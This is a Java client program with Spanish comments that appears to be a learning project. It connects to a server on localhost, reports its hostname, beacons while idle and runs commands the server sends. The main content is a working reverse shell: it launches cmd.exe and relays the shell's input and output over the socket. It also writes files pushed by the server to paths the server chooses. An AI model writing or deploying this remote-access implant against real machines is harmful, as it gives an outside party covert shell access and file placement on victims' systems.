import java.util.*;
import java.net.*;
import java.io.*;
import java.nio.*;
import java.nio.file.Files;

public class Cliente {
    public static void main (String[] args){

        try{
        

            Scanner stdIn = new Scanner(System.in);

            Socket s = new Socket("127.0.0.1",6666);
            
            DataInputStream dint = new DataInputStream(s.getInputStream());
            DataOutputStream dout = new DataOutputStream(s.getOutputStream());

            InetAddress IP = InetAddress.getLocalHost();
            String hostname = IP.getHostName();
            System.out.println(IP.toString());
            byte[] mensajeByte = hostname.getBytes();
            dout.writeInt(mensajeByte.length);
            dout.write(mensajeByte);

            System.out.println("Esperando aprobacion...");

            String mensaje;

            while(true){

                try{

                    s.setSoTimeout(5*1000);
                    
                    mensajeByte = new byte[dint.readInt()];
                    dint.readFully(mensajeByte, 0, mensajeByte.length);
                    byte[] conexion = mensajeByte;
                    System.out.println("Conectado al servidor.");

                    while(conexion[0]==49){//Cambiamos el estado conexion a '1' si el servidor nos comunica que quiere comunicarse con nostros.

                        try{

                            System.out.println("Esperando instrucciones...");

                            mensajeByte = new byte[dint.readInt()];
                            dint.readFully(mensajeByte,0,mensajeByte.length);
                            
                            if(mensajeByte[0]==83){ /*En primer lugar, verificamos si el servidor quiere cambiar de servidor. Si recibimos una 'S' interpretamos que es así
                            e iniciamos un proceso por el cual le comunicamos al hilo de esuchca del servidor (mediado mediante booleans) que debe cerrarse y nos quedamos
                            ante la espectativa de que el servidor se vuelva a comunicarnos con nostros.*/

                                System.out.println("En espera...");
                                dout.writeInt(mensajeByte.length);
                                dout.write(mensajeByte); 

                                boolean hilocerrado = dint.readBoolean();
                                dout.writeBoolean(hilocerrado);
                                conexion[0]=48;/*Cambiamos el estado conexion a '0' y nos metemos en un bucle a la espera de un boolean del servidor para salir de dicho
                                bucle y volver a comunicarnos con el Servidor.*/

                                while(conexion[0]==48){

                                    try{ /* En este bucle estamos a la espectativa de dicho boolean y cada cierto tiempo emitimos un beacon para informar de que 
                                        seguimos conectados. Esto está implementado mediante un boolean. */

                                        mensajeByte = new byte[dint.readInt()];
                                        dint.readFully(mensajeByte, 0, mensajeByte.length);
                                        conexion = mensajeByte;

                                    } catch (Exception a) {

                                        mensajeByte = new byte[1];
                                        mensajeByte[0] = 0x00;
                                        dout.writeInt(mensajeByte.length);
                                        dout.write(mensajeByte, 0, mensajeByte.length);

                                    }

                                }

                                System.out.println("Conexion recuperada.");

                            } else { //Si no quiere cambiar de servidor entonces procedemos a evaluar el encabezado del array del servidor.

                                /*Dispones de tres opciones, cambiar un dato de sistema numérico, iniciar un programa, entre los cuales está la cmd en el que se 
                                abrirá inmediatamente una "reverse shell" y por último subir o bajar un archivo. Diferenciar cada opción dependerá del primer byte del
                                encabezado y diferenciar entre subdivisiones de las distintas opciones dependerá de los siguientes bytes del encabezado. */

                                byte[] datoByte = new byte[mensajeByte.length - 3];

                                for (int i = 0; i < datoByte.length; i++) {

                                    datoByte[i] = mensajeByte[i + 3];

                                }

                                String dato = new String(datoByte);

                                System.out.println(dato);

                                /*Ahora vamos a implementar una serie de if, else if para diferenciar entre las distintas opciones que el cliente puede elaborar
                                con la información recibida por el servidor.*/

                                if (mensajeByte[0]==0x01){

                                    System.out.println("Cambio de sistema numérico");

                                    int decimal = 0;

                                    try{
                                    
                                    switch (mensajeByte[1]){

                                        /* Construimos un entero decimal con el dato indicando la base en
                                        la que se aporta la información en String. Recordamos que esto está
                                        construido para que se indique el formato de entrada y posteriormente
                                        el dato de salida. */
                                        

                                        case 0x01:

                                            decimal = Integer.parseInt(dato,2);

                                            break;

                                        case 0x02:

                                            decimal = Integer.parseInt(dato);

                                            break;

                                        case 0x03:

                                            decimal = Integer.parseInt(dato,16);

                                            break;
                                    }

                                    switch (mensajeByte[2]){

                                        /* En función del dato de salida pedido, construimos con el entero de la 
                                        sección anterior un entero en el sistema numérico concreto en formato String. */
                                        

                                        case 0x01:

                                            dato = Integer.toBinaryString(decimal);

                                            break;

                                        case 0x02:

                                            dato = String.valueOf(decimal);

                                            break;

                                        case 0x03:

                                            dato = Integer.toHexString(decimal);

                                            break;

                                    }


                                    mensajeByte = dato.getBytes();
                                    dout.writeInt(mensajeByte.length);
                                    dout.write(mensajeByte);

                                } catch (Exception e) {

                                    System.out.println("No se pudo llevar a cabo el cambio de dato. Formato no válido.");
                                }

                                } else if (mensajeByte[0]==0x02){

                                    System.out.println("Abrir un programa");

                                    if(mensajeByte[1]==0x00){

                                        try{
                                            
                                            s.setSoTimeout(0);
                                            System.out.println("    Construyendo terminal...");
                                            ProcessBuilder builder = new ProcessBuilder("cmd.exe");
                                            builder.redirectErrorStream(true); //Esto nos devuelve el error del proceso cuando se de el caso.
                                            Process p = builder.start(); //Construimos un proceso inicializando la construcción de proceso que teníamos con ProcessBuilder.
                                            //Estos objetos disponen de métodos que permitirán manejar la entrada y salida de bytes del proceso.
                                            OutputStream pout = p.getOutputStream(); 
                                            InputStream pin = p.getInputStream();
                                            
                                            byte[] array = new byte[8000];
                                            int a, n;
                                            System.out.println("    Terminal completada.");
                                            
                                            while(p.isAlive()){
                                                
                                                
                                                System.out.println("Recogiendo de la cmd...");
                                                a = pin.read(array, 0, array.length); //Este método lee el input desde el punto de vista del proceso construido (es decir, lo que el proceso nos introduce a nosotros, que desde nuestra perpectiva seria su output) desde el offset 0 hasta el offset a en forma de flujo de bytes que almacena en el array1. 
                                                    
                                                System.out.println("Pasando informacion a String");
                                                mensaje = new String (array,0,a);
                                                mensajeByte = mensaje.getBytes();
                        
                                                System.out.println("Mandada informacion");
                        
                                                dout.writeInt(mensajeByte.length);
                                                dout.write(mensajeByte);
                        
                                                System.out.println("Informacion mandada.");
                        
                                                
                        
                                                //Así envíamos un String contruido mediante los bytes de la salida del proceso.
                                                
                                                //A continuación con la información recibida del servidor leemos un flujo de bytes y lo reconstruimos en un array para luego introducirlo como input en el proceso.
                                                System.out.println("Recibiendo datos del Servidor.");
                                                n = dint.readInt(); 
                                                if(n>0) {dint.readFully(array, 0, array.length);}
                                                pout.write(array,0,n);
                                                pout.flush();
                        
                                                System.out.println("Datos introducidos en la terminal");
                                                Thread.sleep(500);
                        
                        
                        
                                                
                                            
                                            }//Fin de while/try/exec cmd.exe.
                        
                                            System.out.println("Fin de la terminal.");
                                            s.setSoTimeout(5*1000);
                        
                                            
                        
                                        } catch (Exception e) {} //Fin try/exec cmd.exe.

                                        }

                                    } else if (mensajeByte[0]==0x03){
                                    

                                        System.out.println("Abrir un programa");
    
                                        if(mensajeByte[1]==0x00){
                                            
                                            System.out.println("Se quiere recibir un archivo.");
                                            System.out.println("Recibiendo datos.");
    
                                            dint.readBoolean(); /*Utilizamos la recepción de boolean para marcar la separación
                                            de los distintos procesos.*/
    
                                            int fileSize = dint.readInt();
                                            byte[] arrayFile = new byte[fileSize];
    
                                            try{
    
                                                if (fileSize>0) {
                                                    
                                                    dint.readFully(arrayFile, 0, arrayFile.length); 
                                                    
                                                }
    
                                            } catch (Exception t){
    
                                                System.out.println("Error al recibir el fichero.");
    
                                            }
    
                                            dint.readBoolean();
    
                                            mensajeByte = new byte[dint.readInt()];
                                            dint.readFully(mensajeByte, 0, mensajeByte.length);
    
                                            FileOutputStream fos = new FileOutputStream(new String (mensajeByte));
                                            fos.write(arrayFile);
                                            fos.close();
                                        }

                                    }

                            }//Fin de else cambiar conexion.

                        } catch (Exception t) {

                            mensajeByte = new byte[1];
                            mensajeByte[0] = 0x00;
                            dout.writeInt(mensajeByte.length);
                            dout.write(mensajeByte, 0, mensajeByte.length);
                        }

                    }

                } catch (Exception e) {

                    mensajeByte = new byte[1];
                    mensajeByte[0] = 0x00;
                    dout.writeInt(mensajeByte.length);
                    dout.write(mensajeByte, 0, mensajeByte.length);

                }

            }//Fin de while.

        } catch (Exception y){}

       

    }

}